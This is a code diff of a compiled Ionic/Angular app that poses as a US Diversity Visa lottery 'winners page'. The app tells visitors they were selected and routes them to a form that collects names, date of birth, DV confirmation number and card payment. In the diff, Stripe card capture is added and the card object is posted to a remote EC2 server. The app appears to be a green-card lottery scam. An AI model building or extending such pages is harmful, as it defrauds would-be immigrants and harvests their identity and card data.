@@ -45,7 +45,7 @@ var FirstPage = /** @class */ (function () {
     };
     FirstPage = __decorate([
         Object(__WEBPACK_IMPORTED_MODULE_0__angular_core__["m" /* Component */])({
-            selector: 'page-first',template:/*ion-inline-start:"C:\Users\erico\angular4app\lehub\hub\src\pages\first\first.html"*/'<!--\n  Generated template for the FirstPage page.\n\n  See http://ionicframework.com/docs/components/#navigation for more info on\n  Ionic pages and navigation.\n-->\n<ion-header>\n\n  <ion-navbar color="primary">\n    <ion-title class="titre2">AMERICAN DV LOTTERY 2019, WINNERS PAGE</ion-title>\n  </ion-navbar>\n\n</ion-header>\n\n\n<ion-content padding>\n    \n    <ion-grid>\n      <ion-row class="photo">\n        <ion-col col-12 col-md-12 offset-md col-lg-11 offset-lg-1 col-xl-11 offset-xl-1 >\n            <ion-img width="1400" height="300" src="assets/image7.png"></ion-img>\n        </ion-col>\n      </ion-row>\n      <ion-row class="titre">\n        <ion-col offset-5>\n          <h5 >WELCOME TO ALL WINNERS </h5>\n        </ion-col>\n      </ion-row>\n      <ion-row>\n        <ion-col col-12 col-md-6  col-lg-8 offset-lg-2  col-xl-8 offset-xl-2>\n          <p>\n          You are one of teh teh winners randomly selected by a computer, out of teh 13.5 millions entries registered for the Diversity Immigrant Visa Program 2019.<br> It is a United stated congresionally mandated lottery program for receiving a United Stated Resident Card. Also known as Green Card Lottery.\n\n          </p>\n\n        </ion-col>\n          <ion-col offset-5>\n           <button color="danger" ion-button (click)="formulaire()">click here to proceed</button>\n          </ion-col>\n        </ion-row>\n        <ion-row>\n          <ion-col col-12 col-md-6 col-lg-4 col-xl-3 *ngFor="let item of items">\n            <ion-card>\n            <!--  <ion-card-header>{{ item.title }}</ion-card-header>\n              <ion-card-content>{{ item.text }}</ion-card-content>\n            -->\n              <img [src]="item.url">\n            </ion-card>\n          </ion-col>\n        </ion-row>\n      </ion-grid>\n\n</ion-content>\n'/*ion-inline-end:"C:\Users\erico\angular4app\lehub\hub\src\pages\first\first.html"*/,
+            selector: 'page-first',template:/*ion-inline-start:"C:\Users\erico\angular4app\lehub\hub\src\pages\first\first.html"*/'<!--\n  Generated template for the FirstPage page.\n\n  See http://ionicframework.com/docs/components/#navigation for more info on\n  Ionic pages and navigation.\n-->\n<ion-header>\n\n  <ion-navbar color="primary">\n    <ion-title class="titre2">AMERICAN DV LOTTERY 2019, WINNERS PAGE</ion-title>\n  </ion-navbar>\n\n</ion-header>\n\n\n<ion-content padding>\n    \n    <ion-grid>\n      <ion-row class="photo">\n        <ion-col col-12 col-md-12 offset-md col-lg-11 offset-lg-1 col-xl-11 offset-xl-1 >\n            <ion-img width="1400" height="300" src="assets/image7.png"></ion-img>\n        </ion-col>\n      </ion-row>\n      <ion-row class="titre">\n        <ion-col offset-5>\n          <h5 >WELCOME TO ALL WINNERS </h5>\n        </ion-col>\n      </ion-row>\n      <ion-row>\n        <ion-col col-12 col-md-6  col-lg-8 offset-lg-2  col-xl-8 offset-xl-2>\n          <p>\n          You are one of the winners randomly selected by a computer, out of the 13.5 millions entries registered for the Diversity Immigrant Visa Program 2019.<br> It is a United stated congressionally mandated lottery program for receiving a United Stated Resident Card. Also known as Green Card Lottery.\n\n          </p>\n\n        </ion-col>\n          <ion-col offset-5>\n           <button color="danger" ion-button (click)="formulaire()">click here to proceed</button>\n          </ion-col>\n        </ion-row>\n        <ion-row>\n          <ion-col col-12 col-md-6 col-lg-4 col-xl-3 *ngFor="let item of items">\n            <ion-card>\n            <!--  <ion-card-header>{{ item.title }}</ion-card-header>\n              <ion-card-content>{{ item.text }}</ion-card-content>\n            -->\n              <img [src]="item.url">\n            </ion-card>\n          </ion-col>\n        </ion-row>\n      </ion-grid>\n\n</ion-content>\n'/*ion-inline-end:"C:\Users\erico\angular4app\lehub\hub\src\pages\first\first.html"*/,
         }),
         __metadata("design:paramtypes", [__WEBPACK_IMPORTED_MODULE_1_ionic_angular__["h" /* NavController */], __WEBPACK_IMPORTED_MODULE_1_ionic_angular__["i" /* NavParams */]])
     ], FirstPage);
@@ -64,12 +64,11 @@ var FirstPage = /** @class */ (function () {
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__angular_core__ = __webpack_require__(0);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_ionic_angular__ = __webpack_require__(29);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_2__angular_forms__ = __webpack_require__(15);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_rxjs_add_observable_of__ = __webpack_require__(246);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_rxjs_add_observable_of__ = __webpack_require__(245);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_rxjs_add_observable_of___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_3_rxjs_add_observable_of__);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_4__angular_http__ = __webpack_require__(155);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_5_rxjs_add_operator_map__ = __webpack_require__(248);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_5_rxjs_add_operator_map__ = __webpack_require__(247);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_5_rxjs_add_operator_map___default = __webpack_require__.n(__WEBPACK_IMPORTED_MODULE_5_rxjs_add_operator_map__);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_6__ionic_native_stripe__ = __webpack_require__(156);
 var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
     var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
     if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
@@ -79,7 +78,6 @@ var __decorate = (this && this.__decorate) || function (decorators, target, key,
 var __metadata = (this && this.__metadata) || function (k, v) {
     if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
 };
-
 
 
 
@@ -99,51 +97,51 @@ var PayementPage = /** @class */ (function () {
     //expinumber:AbstractControl;
     //expinumbermonth:AbstractControl;
     // cardcvc:AbstractControl;
-    function PayementPage(navCtrl, navParams, formBuilder, loadingCtrl, alertCtrl, http, stripe, plt) {
+    function PayementPage(navCtrl, navParams, formBuilder, loadingCtrl, alertCtrl, http, plt) {
         this.navCtrl = navCtrl;
         this.navParams = navParams;
         this.formBuilder = formBuilder;
         this.loadingCtrl = loadingCtrl;
         this.alertCtrl = alertCtrl;
         this.http = http;
-        this.stripe = stripe;
         this.plt = plt;
-        this.card = {
-            // $key: String,
-            numero: '',
-            expiyear: '',
-            expimonth: '',
-            cvc: '',
-        };
+        this.stripe = Stripe('pk_test_tjSHLnJNmKmBQsZe8GskmE0q');
         this.carde = {
             // $key: String,
-            name: '',
-            surname: '',
-            dateofbirth: '',
-            confignumber: '',
+            //  name: '',
+            //  surname: '',
+            //  dateofbirth: '',
+            // confignumber: '',
             age: '',
             numero: '',
             nom: '',
             prenom: ''
         };
+        this.items = [
+            { url: 'https://stripe.com/img/documentation/checkout/marketplace.png' }
+        ];
         this.publishableKey = 'pk_test_tjSHLnJNmKmBQsZe8GskmE0q';
         this.cardes = formBuilder.group({
-            expinumbermonth: ['', __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].compose([
-                    __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].required, __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].minLength(1), __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].maxLength(2),
-                ]),
-            ],
-            expinumber: ['', __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].compose([
-                    __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].required, __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].minLength(3), __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].maxLength(4),
-                ]),
-            ],
-            cardnumber: ['', __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].compose([
-                    __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].required, __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].minLength(2), __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].maxLength(16),
-                ]),
-            ],
-            cardcvc: ['', __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].compose([
-                    __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].required, __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].minLength(2), __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].maxLength(4),
-                ]),
-            ],
+            /*  expinumbermonth:['',Validators.compose([
+                Validators.required, Validators.minLength(1), Validators.maxLength(2),
+              ]),
+             // this.validPassword.bind(this)
+             ],
+             expinumber:['',Validators.compose([
+              Validators.required, Validators.minLength(3), Validators.maxLength(4),
+            ]),
+           // this.validPassword.bind(this)
+           ],
+           cardnumber:['',Validators.compose([
+            Validators.required, Validators.minLength(2), Validators.maxLength(16),
+          ]),
+         // this.validPassword2.bind(this)
+         ],
+         cardcvc:['',Validators.compose([
+          Validators.required, Validators.minLength(2), Validators.maxLength(4),
+        ]),
+        //this.validPassword2.bind(this)
+         ], */
             numero: ['', __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].compose([
                     __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].required, __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].minLength(2), __WEBPACK_IMPORTED_MODULE_2__angular_forms__["f" /* Validators */].maxLength(16),
                 ]),
@@ -170,7 +168,63 @@ var PayementPage = /** @class */ (function () {
          this.cardcvc = this.formgroup.controls['cardcvc']; */
     }
     PayementPage.prototype.ionViewDidLoad = function () {
+        this.setupStripe();
     };
+    //stripe code
+    PayementPage.prototype.setupStripe = function () {
+        var _this = this;
+        var elements = this.stripe.elements();
+        var style = {
+            base: {
+                color: '#32325d',
+                lineHeight: '24px',
+                fontFamily: '"Helvetica Neue", Helvetica, sans-serif',
+                fontSmoothing: 'antialiased',
+                fontSize: '16px',
+                '::placeholder': {
+                    color: '#aab7c4'
+                }
+            },
+            invalid: {
+                color: '#fa755a',
+                iconColor: '#fa755a'
+            }
+        };
+        this.card = elements.create('card', { style: style });
+        this.card.mount('#card-element');
+        this.card.addEventListener('change', function (event) {
+            var displayError = document.getElementById('card-errors');
+            if (event.error) {
+                displayError.textContent = event.error.message;
+            }
+            else {
+                displayError.textContent = '';
+            }
+        });
+        var form = document.getElementById('payment-form');
+        form.addEventListener('submit', function (event) {
+            event.preventDefault();
+            // this.stripe.createToken(this.card)
+            _this.stripe.createSource(_this.card).then(function (result) {
+                if (result.error) {
+                    var errorElement = document.getElementById('card-errors');
+                    errorElement.textContent = result.error.message;
+                }
+                else {
+                    console.log(result);
+                    var headers = new __WEBPACK_IMPORTED_MODULE_4__angular_http__["a" /* Headers */]();
+                    // headers.append('Content-Type', 'application/x-www-form-urlencoded');
+                    headers.append('Content-Type', 'application/json');
+                    _this.http.post('http://localhost:3000/payer', JSON.stringify(result), { headers: headers }).map(function (res) { return res.json(); }).subscribe(function (data) {
+                        console.log(data.message);
+                        alert(data.message + "\n" +
+                            data.message2);
+                    });
+                }
+            });
+        });
+    };
+    //fin code stripe
     PayementPage.prototype.payer = function () {
         var _this = this;
         if (this.plt.is('cordova')) {
@@ -207,7 +261,9 @@ var PayementPage = /** @class */ (function () {
             var headers = new __WEBPACK_IMPORTED_MODULE_4__angular_http__["a" /* Headers */]();
             // headers.append('Content-Type', 'application/x-www-form-urlencoded');
             headers.append('Content-Type', 'application/json');
-            this.http.post('http://localhost:3000/payer', JSON.stringify(this.card), { headers: headers }).map(function (res) { return res.json(); }).subscribe(function (data) {
+            // this.http.post('http://localhost:3000/payer',  JSON.stringify(this.card), {headers: headers} )
+            this.http.post('http://ec2-18-222-66-128.us-east-2.compute.amazonaws.com:3000/payer', JSON.stringify(this.card), { headers: headers })
+                .map(function (res) { return res.json(); }).subscribe(function (data) {
                 console.log(data.message);
                 alert(data.message + "\n" +
                     data.message2);
@@ -266,10 +322,10 @@ var PayementPage = /** @class */ (function () {
     };
     PayementPage = __decorate([
         Object(__WEBPACK_IMPORTED_MODULE_0__angular_core__["m" /* Component */])({
-            selector: 'page-payement',template:/*ion-inline-start:"C:\Users\erico\angular4app\lehub\hub\src\pages\payement\payement.html"*/'<!--\n  Generated template for the PayementPage page.\n\n  See http://ionicframework.com/docs/components/#navigation for more info on\n  Ionic pages and navigation.\n-->\n<ion-header>\n\n  <ion-navbar color="primary">\n    <ion-title ></ion-title>\n  </ion-navbar>\n\n</ion-header>\n\n\n<ion-content padding>\n  <ion-grid>\n      <ion-row class="photo2">\n          <ion-col col-12 col-md-6 offset-md-3 col-lg-8 offset-lg-3 col-xl-8 offset-xl-3 >\n              <ion-img width="680" height="365" src="assets/image8.png"></ion-img>\n          </ion-col>\n    </ion-row>\n    <ion-row>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="150" height="100" src="assets/image9.png"></ion-img>\n        </ion-col>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="150" height="135" src="assets/image12.png"></ion-img>\n        </ion-col>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="160" height="100" src="assets/image11.png"></ion-img>\n        </ion-col>\n    </ion-row>\n\n    <form [formGroup]="cardes" (ngSubmit)="logForm()">\n\n            <ion-row>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >SURNAME</ion-label>\n                            <ion-input type="text" formControlName="nom"></ion-input>\n                        </ion-item>\n                    </ion-col>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >FIRST NAME</ion-label>\n                            <ion-input type="text" formControlName="prenom"></ion-input>\n                        </ion-item>\n                    </ion-col>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >DATE OF BIRTH</ion-label>\n                            <ion-input type="text" formControlName="age" placeholder="01/01/1973"></ion-input>\n                        </ion-item>\n                </ion-col>\n                <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >CONFIRMATION NUMBER</ion-label>\n                            <ion-input type="nom" formControlName="numero"></ion-input>\n                        </ion-item>\n                </ion-col>\n                </ion-row>\n    \n    \n    <ion-row>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD NUMBER</ion-label>\n            <ion-input type="number" formControlName="cardnumber"></ion-input>\n       </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD EXPIRY MONTH</ion-label>\n            <ion-input type="number" formControlName="expinumbermonth"></ion-input>\n        </ion-item>  \n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n      <ion-item>\n        <ion-label>CARD EXPIRY YEAR</ion-label>\n            <ion-input type="number" formControlName="expinumber"></ion-input>\n       </ion-item> \n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD CVC</ion-label>\n            <ion-input type="number" formControlName="cardcvc"></ion-input>\n         </ion-item>\n    </ion-col>\n    </ion-row>\n    <ion-row>\n        <ion-col col-sm-12 col-lg-8 offset-lg-2>\n            <button ion-button full type="submit" [disabled]="!cardes.valid">Submit</button>\n        </ion-col>\n    </ion-row>\n    </form>\n\n\n<!--\n    <ion-row>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>SURNAME</ion-label>\n                <ion-input [(ngModel)]="carde.name"></ion-input>\n            </ion-item>\n        </ion-col>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>FIRST NAME</ion-label>\n                <ion-input [(ngModel)]="carde.surname"></ion-input>\n            </ion-item>\n        </ion-col>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>DATE OF BIRTH</ion-label>\n                <ion-input [(ngModel)]="carde.dateofbirth"></ion-input>\n            </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>CONFIRMATION NUMBER</ion-label>\n                <ion-input [(ngModel)]="carde.confignumber"></ion-input>\n            </ion-item>\n    </ion-col>\n    </ion-row>\n\n    <ion-row>\n    <ion-col col-12 col-sm col-lg-6>\n\n        <ion-item>\n          <ion-label stacked>CARD NUMBER</ion-label>\n          <ion-input [(ngModel)]="card.numero"></ion-input>\n        </ion-item>\n      </ion-col>\n      <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD EXPIRY YEAR</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.expiyear"></ion-input>\n        </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD EXPIRY MONTH</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.expimonth"></ion-input>\n        </ion-item>\n    </ion-col>\n\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n          <ion-label stacked>CARD CVC</ion-label>\n          <ion-input  type="number" [(ngModel)]="card.cvc"></ion-input>\n        </ion-item>\n    </ion-col>\n</ion-row>\n    <ion-row>\n        <ion-col col-sm-8 col-lg-4 offset-lg-4>\n          <button ion-button full  (click)="payer()">VALIDER</button>\n        </ion-col>\n        <ion-col col-sm-8 col-lg-4 offset-4>\n         \n        </ion-col>\n      </ion-row>\n    -->\n\n\n\n\n\n <!-- <form [formGroup]="cardes" (ngSubmit)="logForm()">\n    <ion-row>\n  <ion-col col-sm-12 col-lg-6 >\n    <ion-item>\n        <ion-label>CARD NUMBER</ion-label>\n        <ion-input type="number" formControlName="cardnumber"></ion-input>\n     </ion-item>\n        <ion-item>\n            <ion-label>CARD EXPIRY MONTH</ion-label>\n            <ion-input type="number" formControlName="expinumbermonth"></ion-input>\n        </ion-item>\n    </ion-col>\n    </ion-row>\n     <ion-item>\n            <ion-label>CARD EXPIRY YEAR</ion-label>\n            <ion-input type="number" formControlName="expinumber"></ion-input>\n     </ion-item>\n    \n     <ion-item>\n            <ion-label>CARD CVC</ion-label>\n            <ion-input type="number" formControlName="cardcvc"></ion-input>\n     </ion-item>\n\n\n     <button ion-button type="submit" [disabled]="!cardes.valid">Submit</button>\n\n</form>\n\n-->\n\n\n\n\n\n\n<!-- \n  <form [formGroup]="formgroup" (ngSubmit)="onSubmit(form)">\n \n     <ion-list>\n       <ion-item [ngClass]="{\'error-border\':!formgroup.controls.firstname.valid && formgroup.controls.firstname.touched}">\n            <ion-label floating>First Name</ion-label>\n            <ion-input formControlName="firstname" type="text"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'required\') && firstname.touched">\n            <p class="para"> *FirstName is required</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'minlength\') && firstname.touched">\n            <p class="para">Sorry, minimum password firstname is 3!</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'maxlength\') && firstname.touched">\n            <p class="para">Sorry, maxlength firstname length is 20!</p>\n        </ion-item>\n        <ion-item *ngIf="firstname.hasError(\'pattern\') && firstname.touched">\n            <p class="para">Sorry, pas de caractéres spéciaux</p>\n        </ion-item>\n  \n\n        <ion-item>\n            <ion-label floating>Last Name</ion-label>\n            <ion-input formControlName="lastname" type="text"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'required\') && lastname.touched ">\n            <p class="para"> *LastName is required</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'minlength\') && lastname.touched">\n            <p class="para">Sorry, minimum password length is 3!</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'maxlength\') && lastname.touched">\n            <p class="para">Sorry, maxlength lastname length is 20!</p>\n        </ion-item>\n        <ion-item *ngIf="lastname.hasError(\'pattern\') && firstname.touched">\n            <p class="para">Sorry, pas de caractéres spéciaux</p>\n        </ion-item>\n    -->\n\n    <!--    <ion-item>\n            <ion-label floating>Card Number</ion-label>\n            <ion-input formControlName="cardnumber" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="cardnumber.hasError(\'required\') && cardnumber.touched">\n            <p> *Age is required</p>\n        </ion-item>\n        <ion-item *ngIf="cardnumber.hasError(\'maxlength\') && cardnumber.touched">\n            <p> *only to number</p>\n        </ion-item>\n        \n        <ion-item>\n            <ion-label floating>Card Expiration Year</ion-label>\n            <ion-input formControlName="expinumber" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="expinumber.hasError(\'required\') && cardnumber.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="expinumber.hasError(\'maxlength\') && expinumber.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n        <ion-item>\n            <ion-label floating>Card Expiration Month</ion-label>\n            <ion-input formControlName="expinumbermonth" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="expinumbermonth.hasError(\'required\') && expinumbermonth.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="expinumbermonth.hasError(\'maxlength\') && expinumbermonth.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n        <ion-item>\n            <ion-label floating>CVC</ion-label>\n            <ion-input formControlName="cardcvc" type="number"></ion-input>\n        </ion-item>\n        <ion-item *ngIf="cardcvc.hasError(\'required\') && cardcvc.touched">\n            <p> *expinumber is required</p>\n        </ion-item>\n        <ion-item *ngIf="cardcvc.hasError(\'maxlength\') && cardcvc.touched">\n            <p> *only to number</p>\n        </ion-item>\n\n\n\n     </ion-list>\n     <button ion-button  color="secondary"  style="margin-top: 20px; width: 250px;" type="submit" >Submit</button>\n  </form>\n  <ion-row>\n        <ion-col col-sm-6 col-md-4 col-lg-4 offset-lg-4 offset-md-4 offset-sm-3> \n            <h1>Checkout</h1>\n            <h4>Your Total: $</h4>\n            \n        </ion-col>\n    </ion-row>\n  <form method="post" action="https://www.my-dohone.com/dohone/pay">\n    <ion-row>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n            <div>\n               \n                <input type="text" id="name" class="formu" placeholder="Name" required>\n            </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="text" id="adress" class="formu" placeholder="adresse" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="text" id="oldername" class="formu" placeholder="older name" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    \n                    <input type="number" id="card-number" class="formu" placeholder="credit card number" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-3 offset-lg-5>\n                <div>\n                    <input type="number" id="expiartion" class="formu" placeholder="Expiration Mounth" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-3 >\n                <div>\n                    <input type="number" id="expiartiony" class="formu" placeholder="Expiration Year" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <div>\n                    <input type="number" id="cvs" class="formu" placeholder="CVS" required>\n                </div>\n        </ion-col>\n        <ion-col col-xs-12 col-lg-6 offset-lg-5>\n                <button ion-button  color="secondary"  style="margin-top: 20px; width: 250px;" type="submit" >Submit</button>\n        </ion-col>\n    </ion-row>\n \n</form>  -->\n\n\n</ion-grid>\n\n\n\n</ion-content>\n'/*ion-inline-end:"C:\Users\erico\angular4app\lehub\hub\src\pages\payement\payement.html"*/,
+            selector: 'page-payement',template:/*ion-inline-start:"C:\Users\erico\angular4app\lehub\hub\src\pages\payement\payement.html"*/'<!--\n  Generated template for the PayementPage page.\n\n  See http://ionicframework.com/docs/components/#navigation for more info on\n  Ionic pages and navigation.\n-->\n<ion-header>\n\n  <ion-navbar color="primary">\n    <ion-title ></ion-title>\n  </ion-navbar>\n\n</ion-header>\n\n\n<ion-content padding>\n  <ion-grid>\n      <ion-row class="photo2">\n          <ion-col col-12 col-md-6 offset-md-3 col-lg-8 offset-lg-3 col-xl-8 offset-xl-3 >\n              <ion-img width="680" height="365" src="assets/image8.png"></ion-img>\n          </ion-col>\n    </ion-row>\n    <ion-row>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="150" height="100" src="assets/image9.png"></ion-img>\n        </ion-col>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="150" height="135" src="assets/image12.png"></ion-img>\n        </ion-col>\n        <ion-col col-lg-3 offset-lg-1 col-xl-3 offset-xl-1>\n            <ion-img width="160" height="100" src="assets/image11.png"></ion-img>\n        </ion-col>\n    </ion-row>\n    <!-- test api stripe -->\n\n      <form action="/" method="post" id="payment-form" [formGroup]="cardes">\n    \n        <div class="form-row">\n          <div id="card-element">\n            <!-- a Stripe Element will be inserted here. -->\n          </div>\n           <!-- customer info -->\n          <ion-row>\n                <ion-col col-12 col-sm col-lg-6>\n        \n                    <ion-item>\n                        <ion-label >SURNAME</ion-label>\n                        <ion-input type="text" formControlName="nom"></ion-input>\n                    </ion-item>\n                </ion-col>\n                <ion-col col-12 col-sm col-lg-6>\n        \n                    <ion-item>\n                        <ion-label >FIRST NAME</ion-label>\n                        <ion-input type="text" formControlName="prenom"></ion-input>\n                    </ion-item>\n                </ion-col>\n                <ion-col col-12 col-sm col-lg-6>\n        \n                    <ion-item>\n                        <ion-label >DATE OF BIRTH</ion-label>\n                        <ion-input type="text" formControlName="age" placeholder="01/01/1973"></ion-input>\n                    </ion-item>\n            </ion-col>\n            <ion-col col-12 col-sm col-lg-6>\n        \n                    <ion-item>\n                        <ion-label >CONFIRMATION NUMBER</ion-label>\n                        <ion-input type="nom" formControlName="numero"></ion-input>\n                    </ion-item>\n            </ion-col>\n            </ion-row>\n    \n          <!-- Used to display Element errors -->\n          <div id="card-errors" role="alert"></div>\n        </div>\n        <ion-row>\n                <ion-col col-sm-12 col-lg-8 offset-lg-2>\n                        <button ion-button  full [disabled]="!cardes.valid">CLICK HERE TO CONFIRM</button>\n                </ion-col>\n            </ion-row>\n     \n        \n      </form>\n\n <!-- test api stripe fin code -->\n  <!-- ancien forms\n<form [formGroup]="cardes" (ngSubmit)="logForm()">\n\n            <ion-row>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >SURNAME</ion-label>\n                            <ion-input type="text" formControlName="nom"></ion-input>\n                        </ion-item>\n                    </ion-col>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >FIRST NAME</ion-label>\n                            <ion-input type="text" formControlName="prenom"></ion-input>\n                        </ion-item>\n                    </ion-col>\n                    <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >DATE OF BIRTH</ion-label>\n                            <ion-input type="text" formControlName="age" placeholder="01/01/1973"></ion-input>\n                        </ion-item>\n                </ion-col>\n                <ion-col col-12 col-sm col-lg-6>\n            \n                        <ion-item>\n                            <ion-label >CONFIRMATION NUMBER</ion-label>\n                            <ion-input type="nom" formControlName="numero"></ion-input>\n                        </ion-item>\n                </ion-col>\n                </ion-row>\n    \n    \n    <ion-row>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD NUMBER</ion-label>\n            <ion-input type="number" formControlName="cardnumber"></ion-input>\n       </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD EXPIRY MONTH</ion-label>\n            <ion-input type="number" formControlName="expinumbermonth"></ion-input>\n        </ion-item>  \n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n      <ion-item>\n        <ion-label>CARD EXPIRY YEAR</ion-label>\n            <ion-input type="number" formControlName="expinumber"></ion-input>\n       </ion-item> \n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n        <ion-item>\n            <ion-label>CARD CVC</ion-label>\n            <ion-input type="number" formControlName="cardcvc"></ion-input>\n         </ion-item>\n    </ion-col>\n    </ion-row>\n    <ion-row>\n        <ion-col col-sm-12 col-lg-8 offset-lg-2>\n            <button ion-button full type="submit" [disabled]="!cardes.valid">Submit</button>\n        </ion-col>\n    </ion-row>\n    </form>\n-->\n\n    \n\n\n<!--\n    <ion-row>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>SURNAME</ion-label>\n                <ion-input [(ngModel)]="carde.name"></ion-input>\n            </ion-item>\n        </ion-col>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>FIRST NAME</ion-label>\n                <ion-input [(ngModel)]="carde.surname"></ion-input>\n            </ion-item>\n        </ion-col>\n        <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>DATE OF BIRTH</ion-label>\n                <ion-input [(ngModel)]="carde.dateofbirth"></ion-input>\n            </ion-item>\n    </ion-col>\n    <ion-col col-12 col-sm col-lg-6>\n\n            <ion-item>\n                <ion-label stacked>CONFIRMATION NUMBER</ion-label>\n                <ion-input [(ngModel)]="carde.confignumber"></ion-input>\n            </ion-item>\n    </ion-col>\n    </ion-row>\n\n    <ion-row>\n    <ion-col col-12 col-sm col-lg-6>\n\n        <ion-item>\n          <ion-label stacked>CARD NUMBER</ion-label>\n          <ion-input [(ngModel)]="card.numero"></ion-input>\n        </ion-item>\n      </ion-col>\n  